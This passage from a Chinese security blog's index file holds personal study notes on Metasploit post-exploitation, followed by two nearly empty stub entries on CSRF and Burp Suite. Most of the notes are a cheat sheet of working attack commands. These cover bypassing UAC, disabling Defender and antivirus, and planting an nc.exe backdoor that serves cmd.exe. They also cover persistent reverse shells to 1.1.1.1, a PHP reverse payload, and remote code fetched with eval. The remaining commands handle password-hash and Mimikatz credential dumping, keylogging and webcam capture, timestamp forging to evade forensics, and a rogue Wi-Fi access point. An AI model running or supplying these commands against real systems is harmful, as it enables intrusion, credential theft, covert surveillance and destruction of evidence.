title="msf后渗透测试"></a>msf后渗透测试</h1><blockquote><p>信息搜集=&gt;漏洞探测=&gt;漏洞利用=&gt;权限提升=&gt;内网渗透=&gt;后门持久化=&gt;清除痕迹</p><p><a href="https://www.freebuf.com/news/210292.html" target="_blank" rel="noopener">https://www.freebuf.com/news/210292.html</a></p></blockquote><p><img src="https://image.3001.net/images/20190803/1564816737_5d453561a6ff0.png!small" alt="微信图片_20190803151851.png"></p><h2 id="绕过UAC限制"><a href="#绕过UAC限制" class="headerlink" title="绕过UAC限制"></a>绕过UAC限制</h2><blockquote><h3 id="1-什么是UAC？"><a href="#1-什么是UAC？" class="headerlink" title="1.什么是UAC？"></a>1.什么是UAC？</h3><p>Microsoft的Windows Vista和Windows Server 2008操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。它是<code>Windows的一个安全功能</code>，它支持防止对操作系统进行未经授权的修改，UAC确保<code>仅在管理员授权的情况下</code>进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。</p><h3 id="2-UAC如何运行？"><a href="#2-UAC如何运行？" class="headerlink" title="2.UAC如何运行？"></a>2.UAC如何运行？</h3><p>UAC通过<code>阻止程序执行任何涉及有关系统更改/特定任务的任务</code>来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被<code>“提升权限”</code>，而不是以管理员身份运行的程序。</p><p>因为有的用户是没有管理员权限，没有管理员权限是运行不了哪些只能通过管理员权限才能操作的命令。比如修改注册表信息、创建用户、读取管理员账户密码、设置计划任务添加到开机启动项等操作。</p><p>最直接的提权命令：getsystem</p><p>绕过UAC防护机制的<code>前提</code>是我们首先<code>通过exploit获得目标主机的meterprter</code>。获得meterpreter会话后，输入以下命令以检查是否是system权限。在这里我就不直接演示了，直接上命令，自己多练习练习即可，所话说熟能生巧。我们需要把获取到的session保存到后台，执行background</p></blockquote><h3 id="绕过-UAC的四种方式"><a href="#绕过-UAC的四种方式" class="headerlink" title="绕过 UAC的四种方式"></a>绕过 UAC的四种方式</h3><h4 id="Windows权限提升绕过UAC保护（内存注入）"><a href="#Windows权限提升绕过UAC保护（内存注入）" class="headerlink" title="Windows权限提升绕过UAC保护（内存注入）"></a>Windows权限提升绕过UAC保护（内存注入）</h4><h4 id="通过COM处理程序劫持"><a href="#通过COM处理程序劫持" class="headerlink" title="通过COM处理程序劫持"></a>通过COM处理程序劫持</h4><h4 id="通过Eventvwr注册表项"><a href="#通过Eventvwr注册表项" class="headerlink" title="通过Eventvwr注册表项"></a>通过Eventvwr注册表项</h4><ol><li><p>获取system账号权限</p><ol><li><p>load priv</p></li><li><p>getsystem</p><ol><li>priv_elevate_getsystem: Operation failed: Access is denied.</li></ol></li><li><p>use exploit/windows/local/ask</p><ol><li>set session</li><li>set filename</li></ol></li><li><p>use exploit/windows/local/bypassuac(将通过进程注入使用可信任发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。)</p></li><li><p>use exploit/windows/local/bypassuac_injection</p><ol><li>set session</li><li>set payload</li></ol></li></ol></li><li><p>利用漏洞直接提权为system</p><ol><li>use exploit/windows/local/ms13_053_schlamperei</li><li>use exploit/windows/local/ms13_081_track_popup_menu</li><li>use exploit/windows/local/ms13_097_ie_registry_symlink</li><li>use exploit/windows/local/ppr_flatten_rec</li></ol></li><li><p>图形化payload</p><ol><li>set payload windows/vncinject/reverse_tcp</li><li>set viewonly no 可操作</li></ol></li><li><p>Psexec 模块之 Passthehash</p><ol><li>use exploit/windows/smb/psexec</li><li>set smbpass hash</li><li>需要提前关闭 UAC<ol><li>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft<br>\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f </li><li>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft<br>\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</li><li>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft<br>\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t<br>REG_DWORD /d 1 /f </li><li>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft<br>\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t<br>REG_DWORD /d 1 /f</li></ol></li></ol></li><li><p>关闭 windows防火墙</p><ol><li>需要管理员或system权限</li><li>netsh advfirewall set allprofiles state on </li></ol></li><li><p>关闭 Windefend</p><ol><li>net stop windefend</li></ol></li><li><p>Bitlocker 磁盘加密</p><ol><li>manage-bde -off C:</li><li>manage-bde -status C:</li></ol></li><li><p>关闭DEP</p><ol><li>bcdedit.exe /set {current} nx AlwaysOff</li></ol></li><li><p>杀死防病毒软件（meterpreter）</p><ol><li>Run killav</li><li>run post/windows/manage/killav（关闭杀毒软件）</li></ol></li><li><p>开启远程桌面服务</p><ol><li>run post/windows/manage/enable_rdp（开启远程桌面）</li><li>run getgui –e（开启远程桌面）<ol><li>run getgui -u yuanfh -p pass</li><li>Run getgui -u cmdback -p 123123  //添加用户</li><li>Run getgui -f 4446 -e //将目标主机上面的3389端口转发到4446</li><li>netsh advfirewall set allprofiles state off //关闭防火墙</li><li>run multi_console_command -rc /root/.msf4/logs/scripts/getgui/<br>clean_up__20160824.1855.rc</li></ol></li></ol></li><li><p>查看远程桌面</p><ol><li>screenshot</li><li>use espia<ol><li>screengrab</li></ol></li></ol></li><li><p>Tokens</p></li><li><p>Incognito</p></li><li><p>搭建域环境</p></li><li><p>load incognito #加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)</p><ol><li><p>list_tokens -u（查看可用的tokenimpersonate_token）</p></li><li><p>list_tokens –g (列出目标主机用户组的可用令牌)</p></li><li><p>impersonate_token lab\administrator</p><blockquote><p>运行上述命令需要getsystem</p><p>本地普通权限用户需县本地提权</p><p>use exploit/windows/local/ms10_015_kitrap0d</p><p>execute -f cmd.exe -i -t 使用当前假冒token执行程序shell </p></blockquote></li></ol></li><li><p>用注册表添加NC后门服务（meterpreter）</p><ol><li>upload /usr/share/windows-binaries/nc.exe C:\windows\system32</li><li>reg enumkey -k HKLM\software\microsoft\windows\currentversion\run</li><li>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc<br>-d ‘C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe’（设置键值）</li><li>reg queryval -k HKLM\software\microsoft\windows\currentversion\Run -<br>v nc（攻击者连接nc后门）</li></ol></li><li><p>打开防火墙端口（meterpreter）</p><ol><li>execute -f cmd -i -H</li><li>netsh firewall show opmode</li><li>netsh firewall add portopening TCP 4444 “test” ENABLE ALL</li><li>shutdown -r -t 0</li><li>nc 1.1.1.1 4444</li></ol></li><li><p>其他注册表项</p><ol><li><a href="https://support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart" target="_blank" rel="noopener">https://support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart</a></li></ol></li><li><p>抓包（meterpreter）</p><ol><li>load sniffer</li><li>sniffer_interfaces（查看网卡）</li><li>sniffer_start 2（选择网卡 开始抓包）</li><li>sniffer_dump 2 1.cap / sniffer_dump 2 1.cap（导出pcap数据包）</li><li>在内存中缓存区块循环存储抓包（50000包），不写硬盘</li><li>智能过滤meterpreter流量，传输全程使用SSL/TLS加密</li></ol></li><li><p>解码</p><ol><li>use auxiliary/sniffer/psnuffle</li><li>set PCAPFILE 1.cap</li></ol></li><li><p>搜索文件</p><ol><li>search -f *.ini</li><li>search -d c:\documents\ and\ settings\administrator\desktop\ -f *.docx</li></ol></li><li><p>John the Ripper破解弱口令</p><ol><li>use post/windows/gather/hashdump #system权限的meterpreter</li><li>Run #结果保存在/tmp目录中</li><li>use auxiliary/analyze/jtr_crack_fast</li><li>run </li></ol></li><li><p>文件系统访问会留下痕迹，电子取整重点关注</p></li><li><p>渗透测试和攻击者往往希望销毁文件系统访问痕迹</p></li><li><p>最好的避免被电子取整发现的方法：不要碰文件系统</p><ol><li>meterpreter的先天优势所在（完全基于内存）</li></ol></li><li><p>MAC时间（modified/accessed/changed）<br>– ls -l –time=atime/mtime/ctime 1.txt<br>– stat 1.txt<br>– touch -d “2 days ago” 1.txt<br>– touch -t 1501010101 1.txt</p></li><li><p>MACE :MFT entry</p><ol><li><p>MFT：NTFS 文件系统 的主文件分配表 Master FileTable</p></li><li><p>通常1024字节或 2个硬盘扇区， 其中存放多想entry 信息</p></li><li><p>包含文件大量信息（大小名称 目录位置 磁盘位置 创建日期）</p></li><li><p>文件系统取整分析技术</p><blockquote><p>伪造时间戳</p></blockquote><ol><li>Timestomp (meterpreter)<br>– timestomp -v 1.txt<br>– timestomp -f c:\autoexec.bat 1.txt<br>– -b -r # 擦除MACE时间信息，<strong>目前此参数功能失效</strong><br>– -m / -a / -c / -e / -z<br>– timestomp -z “MM/DD/YYYY HH24:MI:SS” 2.txt</li></ol></li></ol></li><li><p>pivoting跳板/枢纽/支点</p></li><li><p>pivoting——端口转发portfwd</p><ol><li>利用已经被控计算机，在kali与攻击目标之间实现端口转发<br>– portfwd add -L LIP -l LPORT -r RIP -p RPORT<br>– portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389<br>– portfwd list / delete / flush</li><li>use exploit/windows/smb/ms08_067_netapi<br>– set RHOST 127.0.0.1<br>– set LHOST 2.1.1.10</li><li>use exploit/multi/handler<br>– set exitonsession false</li></ol></li><li><p>POST 模块<br>– run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24<br>– run post/windows/gather/checkvm （查看目标主机是否为虚机）<br>– run post/windows/gather/credentials/credential_collector<br>– run post/windows/gather/enum_applications （获取目标主机安装软件信息）</p><p>run post/windows/manage/enable_rdp（开启3389远程桌面）</p><p>run post/windows/gather/enum_domain  （查找目标主机域控）</p><p>– run post/windows/gather/enum_logged_on_users （列举当前登陆过主机的用户）</p><p> run post/windows/gather/credentials/windows_autologin（抓取自动登陆的用户名和密码）</p><p>run post/windows/manage/enable_rdp username=xxx password=xxx //添加远程桌面的用户(同时也会将该用户添加到管理员组) </p><p>run post/windows/gather/enum_chrome //获取谷歌缓存</p><p>run post/windows/gather/enum_firefox //获取火狐缓存</p><p>run post/windows/gather/enum_ie  //获取IE缓存</p><p>– run post/windows/gather/enum_snmp<br>– run post/multi/recon/local_exploit_suggester<br>– run post/windows/manage/delete_user USERNAME=yuanfh<br>– run post/multi/gather/env<br>– run post/multi/gather/firefox_creds<br>– run post/multi/gather/ssh_creds<br>– run post/multi/gather/check_malware REMOTEFILE=c:\a.exe</p></li><li><p>自动执行meterpreter脚本<br>– set AutoRunScript hostsedit -e 1.1.1.1,<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br>– set InitialAutoRunScript checkvm<br>▪ 自动执行 post 模块<br>– set InitialAutoRunScript migrate -n explorer.exe<br>– set AutoRunScript post/windows/gather/dumplinks</p></li><li><p>摄像头</p><p>Webscan_list    //查看摄像头列表；</p><p>Webscan_stream   //摄像头视频获取；</p><p>Webscan_chat    //查看摄像头接口</p></li><li><p>键盘记录</p><p>keyscan_start   //开启键盘记录功能</p><p>keyscan_dump   //显示捕捉到的键盘记录信息</p><p>keyscan_stop   //停止键盘记录功能</p></li><li><p>持久后门</p><ol><li>利用漏洞取得的meterpreter shell 云星宇内存中，重启失效</li><li>重复exploit 漏洞可能造成服务崩溃</li><li>持久后门保证漏洞修复后仍可远程控制</li><li>run persistence -h（查看帮助）</li><li>run persistence -X -i 10 -p 4444 -r 1.1.1.1-X（指定启动的方式为开机自启动，-i反向连接的时间间隔(10s) –r 指定攻击者的ip）</li><li>run persistence -U -i 20 -p 4444 -r 1.1.1.1（-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数）</li><li>run persistence -S -i 20 -p 4444 -r 1.1.1.1</li></ol></li><li><p>Meterpreter 后门</p><ol><li><p>run metsvc -A(自动安装后门)  删除 -r</p><pre><code>use exploit/multi/handler（连接）set PAYLOAD windows/metsvc_bind_tcpset LPORT 31337set RHOST 1.1.1.1</code></pre></li></ol></li><li><p>MSF 延伸之—— Mimikatz</p></li><li><p>hashdump ֵ使用的就是Mimikatz的部分功能<br>– getsystem<br>– load mimikatz（加载mimikatz，用于抓取密码，不限于明文密码和hash值）</p><p>Run hashdump （获取用户密码hash值）</p><p>– wdigest （读取内存中存放的账号密码明文信息）、kerberos 、msv（获取的是hash值） 、ssp （获取的是明文信息）、tspkg 、livessp<br>– mimikatz_command -h<br>– mimikatz_command -f a::<br>– mimikatz_command -f samdump::hashes（获取用户hash）<br>– mimikatz_command -f handle::list（列出应用进程）<br>– mimikatz_command -f service::list<br>– mimikatz_command -f crypto::listProviders<br>– mimikatz_command -f winmine::infos</p></li><li><p>PHP shell<br>– msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f<br>raw -o a.php<br>– MSF 启动侦听<br>– 上传到web 站点并通过浏览器访问</p></li><li><p>Web Delivery<br>– 利用代码执行漏洞访问攻击者服务器<br>– use exploit/multi/script/web_delivery<br>– set target 1<br>– php -d allow_url_fopen=true -r “eval(file_get_contents(‘<a href="http://1.1.1.1/" target="_blank" rel="noopener">http://1.1.1.1/</a><br>fTYWqmu’));”</p></li><li><p>RFI 远程文件包含<br>– vi /etc/php5/cgi/php.ini #php info 配置文件<br>▪ allow_url_fopen = On<br>▪ allow_url_include = On<br>– use exploit/unix/webapp/php_include<br>– set RHOST 1.1.1.2<br>– set PATH /dvwa/vulnerabilities/fi/<br>– set PHPURI /?page=XXpathXX<br>– set HEADERS “Cookie:security=low;<br>PHPSESSID=eefcf023ba61219d4745ad7487fe81d7”<br>– set payload php/meterpreter/reverse_tcp<br>– set lhost 1.1.1.1<br>– exploit</p></li><li><p>Karmetasploit<br>– ։伪造AP、嗅探密码、截获数据、浏览器攻击<br>– wget <a href="https://www.offensive-security.com/wp-content/uploads/2015/04/" target="_blank" rel="noopener">https://www.offensive-security.com/wp-content/uploads/2015/04/</a><br>karma.rc_.txt<br>▪安装其他依赖包<br>– gem install activerecord sqlite3-ruby</p></li><li><p>基础架构安装配置<br>– apt-get install isc-dhcp-server<br>– cat /etc/dhcp/dhcpd.conf<br>option domain-name-servers 10.0.0.1;<br>default-lease-time 60;<br>max-lease-time 72;<br>ddns-update-style none;<br>authoritative;<br>log-facility local7;<br>subnet 10.0.0.0 netmask 255.255.255.0 {<br>range 10.0.0.100 10.0.0.254;<br>option routers 10.0.0.1;<br> option domain-name-servers 10.0.0.1;<br>}</p></li><li><p>։伪造AP<br>– airmon-ng start wlan0<br>– airbase-ng -P -C 30 -e “FREE” -v wlan0mon<br>– ifconfig at0 up 10.0.0.1 netmask 255.255.255.0<br>– touch /var/lib/dhcp/dhcpd.leases<br>– dhcpd -cf /etc/dhcp/dhcpd.conf at0<br> ▪启动Karmetasploit<br>– msfconsole -q -r karma.rc_.txt </p></li><li><p>允许用户正常上网<br>– vi karma.rc_.txt<br>– 删除setg ݇参数<br>–增加browser_autopwn2等其他模块<br>– 检查恶意流量：auxiliary/vsploit/malware/dns*<br> ۖ▪Karmetasploit<br>– msfconsole -q -r karma.rc_.txt<br> ▪添加路由和防火墙规则<br>– echo 1 &gt; /proc/sys/net/ipv4/ip_forward<br>– iptables -P FORWARD ACCEPT<br>– iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</p></li></ol><h1 id="Armitage-图形化前端"><a href="#Armitage-图形化前端" class="headerlink" title="Armitage 图形化前端"></a>Armitage 图形化前端</h1><ol><li><p>启动方</p><pre><code>service postgresql start</code></pre></li><li><p>发现主机(不写进博客)<br>– 手动添加IP地址<br>– 扫描结果（nmap、nessus、openvas、appscan、nexpose、awvs）<br>– 直接（扫描发现nmap、msf）<br>– DNS 枚举发现<br>▪扫描端口及服务</p><p>工作区܄ workspace<br>–个人视角的目标动态显示筛选，同一team的队员自定义工作区<br>– 基于地址的工作区划分</p><p>– 基于端口的工作区划分<br>– 基于操作系统的工作区划分<br>–基于标签的工作区划分<br>▪生成payload</p><p>▪主动获取目标<br>– Ms08_067<br>▪被动获取目标<br>– Browser_autopwn2<br>▪ Meterpreter shell 能力展示<br>▪菜单功能<br>▪ Cortana脚本<br>– Veil-Evasionғ/use/share/veil-evasion/tools/cortana/veil_evasion.cna<br>– <a href="https://github.com/rsmudge/cortana-scripts" target="_blank" rel="noopener">https://github.com/rsmudge/cortana-scripts</a></p><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107225237451.png" alt="image-20201107225237451"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crsf</title>
      <link href="2020/10/29/crsf/"/>
      <url>2020/10/29/crsf/</url>
      
        <content type="html"><![CDATA[<p>先写上，好逼着自己赶紧抽空把这么学习笔记给完成</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CRSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite</title>
      <link href="2020/10/29/burpsuite/"/>
      <url>2020/10/29/burpsuite/</url>
      
        <content type="html"><![CDATA[<h1 id="首先看师傅怎么学的，不然总感觉自己花时间还像是学到了假的东西"><a href="#首先看师傅怎么学的，不然总感觉自己花时间还像是学到了假的东西" class="headerlink" title="首先看师傅怎么学的，不然总感觉自己花时间还像是学到了假的东西"></a>首先看师傅怎么学的，不然总感觉自己花时间还像是学到了假的东西</h1><p><a href="https://portswigger.net/burp" target="_blank" rel="noopener">https://portswigger.net/burp</a></p><p><a href="https://github.com/snoopysecurity/awesome-burp-extensions" target="_blank" rel="noopener">https://github.com/snoopysecurity/awesome-burp-extensions</a></p><p>先写上，好逼着自己赶紧抽空把这么学习笔记给完成</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
